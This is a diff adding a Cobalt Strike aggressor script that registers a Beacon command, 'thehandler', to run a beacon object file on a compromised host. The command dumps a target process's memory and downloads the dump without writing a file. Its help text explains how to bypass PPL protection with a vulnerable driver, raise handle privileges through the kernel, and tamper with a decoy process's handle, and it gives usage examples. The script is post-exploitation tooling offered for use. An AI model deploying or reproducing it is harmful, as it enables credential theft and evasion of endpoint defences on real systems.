@@ -1,0 +1,54 @@
+alias thehandler {
+    local('$handle $bof $args');
+
+    # read the beacon object file
+    $handle = openf(script_resource("theHandler.o"));
+    $bof = readb($handle, -1);
+    closef($handle);
+
+    # define local vars
+    local('$bid $targetProcess $elevateHandle $decoyProcess $dumpFile');
+    ($bid, $targetProcess, $elevateHandle, $decoyProcess, $dumpFile) = @_;
+
+    # pack args
+    $args = bof_pack($bid, "iiiz", $targetProcess, $elevateHandle, $decoyProcess, $dumpFile);
+
+    # print task to console
+    btask($1, "Creating minidump of target process memory");
+
+    # execute bof
+    beacon_inline_execute($1, $bof, "go", $args);
+}
+
+# register a custom command
+beacon_command_register(
+    "thehandler", 
+    "Create a memory dump of a target process and download it filelessly through beacon.", 
+    
+    "Create a memory dump of a target process and download it filelessly through beacon. Use the elevate and/or decoy arguments to bypass PPL with a vulnerable driver.\n" .
+    "NOTE: The vulnerable driver you use MUST be manually uploaded and installed on the target machine.\n" .
+    
+    "\n[TARGET_PID]     = Target PID for memory dump. Use this argument alone for a standard minidump without kernel manipulation\n" .
+    "[ELEVATE_HANDLE] = Set to 1 to open a low privilege handle and increase its access through the kernel. Set to 0 to open a normal handle\n" .
+    "[DECOY_PID]      = Set to the PID of a benign process. Thehandler will open this process and tamper with its handle to dump your target process\n" .
+    "[DUMP_FILENAME]  = (WIP) Filename to save encrypted minidump on disk. The dump will be downloaded in your current working directory.\n" .
+
+    "\nRun thehandler without arguments to retrieve the Windows build number of the target system.\n" .
+    "NOTE: Avoid the DECOY_PID option if the TARGET_PID process might be exited before or during the Minidump.\n" .
+    "NOTE: Fileless minidumps are a work in progress. Large minidump files causes it to fail currently; opt to save dumps to disk.\n" .
+
+    "\nUsage:\n" .
+    "thehandler [TARGET_PID] [ELEVATE_HANDLE] [DECOY_PID] [DUMP_FILENAME]\n" .
+
+    "\nStandard Minidump for PID 423:\n" .
+    "thehandler 423 0 0 dumpfile.log\n" .
+
+    "\nFileless Minidump for PID 423:\n" .
+    "thehandler 423\n" .
+
+    "\nFileless Minidump with decoy process for PID 423:\n" .
+    "thehandler 423 0 1139\n" .
+
+    "\nFileless Minidump with decoy process AND elevated handle for PID 423:\n" .
+    "thehandler 423 1 1139\n"
+);
